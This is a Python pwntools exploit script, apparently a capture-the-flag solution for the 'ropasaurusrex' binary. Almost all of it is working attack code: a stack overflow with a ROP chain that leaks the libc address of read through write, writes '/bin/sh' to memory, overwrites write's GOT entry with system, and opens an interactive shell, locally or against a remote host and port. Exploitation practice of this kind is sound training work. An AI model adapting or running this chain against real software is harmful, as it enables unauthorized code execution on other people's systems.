#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

def exploit(r):
    off_system = 0x3ADA0
    off_read = 0xD5980
    write = 0x804830C
    pppr = 0x080484b6
    read = 0x804832C
    data = 0x8049620
    write_got = 0x8049614
    read_got = 0x804961C

    buf = ""
    buf += "A"* cyclic_find("kaab")

    buf += p32(write) #leak addr of read
    buf += p32(pppr)
    buf += p32(1)
    buf += p32(read_got)
    buf += p32(4)

    #write /bin/sh\x00 to data
    buf += p32(read)
    buf += p32(pppr)
    buf += p32(0) #stdin
    buf += p32(data)
    buf += p32(8)

    #overwrite write.got with addr of system
    buf += p32(read)
    buf += p32(pppr)
    buf += p32(0)
    buf += p32(write_got)
    buf += p32(4)

    #call write.plt with /bin/sh

    buf += p32(write)
    buf += "BBBB"
    buf += p32(data)


    r.sendline(buf)



    leak = r.recvn(4)
    leak_read = u32(leak)
    base = leak_read - off_read
    system = base + off_system
    log.info("Leaked addr in libc (READ):%s",hex(leak_read))

    r.send("/bin/sh\x00")
    r.send(p32(system))

    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./ropasaurusrex"        #put binary name here
    e = ELF(binary_name)
    libc = ELF("./libc.so.6")
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name, env={"LD_PRELOAD" : "./libc.so.6"})
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804841d",
            "b *0x804841C",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        pause()
        exploit(r)

